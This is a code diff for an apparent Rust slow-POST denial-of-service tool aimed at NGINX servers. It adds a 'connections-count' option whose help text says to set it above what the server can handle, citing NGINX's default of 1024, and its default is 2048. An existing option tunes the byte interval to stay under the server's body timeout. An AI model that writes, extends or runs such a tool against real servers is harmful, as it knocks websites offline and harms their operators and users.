@@ -47,6 +47,10 @@ fn main() {
              .value_name("SECONDS")
              .long("interval")
              .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
+        .arg(Arg::with_name("connections-count")
+             .value_name("INTEGER")
+             .long("connections-count")
+             .help("Number of simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
         .get_matches();
 
     let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
@@ -58,6 +62,7 @@ fn main() {
     let path = parsed_url.path();
     let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
     let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
+    let max_connections_count: usize = value_t!(arguments, "connections-count", usize).unwrap_or(2048);
 
     let mut core = Core::new().unwrap();
     let handle = core.handle();
@@ -73,6 +78,7 @@ fn main() {
     let track_live_connections = live_connections.clone();
     let connection_number = Rc::new(RefCell::new(0usize));
     let cycle = Interval::new_interval(Duration::from_millis(1)).for_each(move |_| {
+        if *live_connections.borrow() >= max_connections_count { return Ok(()) };
         *connection_number.borrow_mut() += 1;
         let connection_number = *connection_number.borrow();
         let host = host.clone();
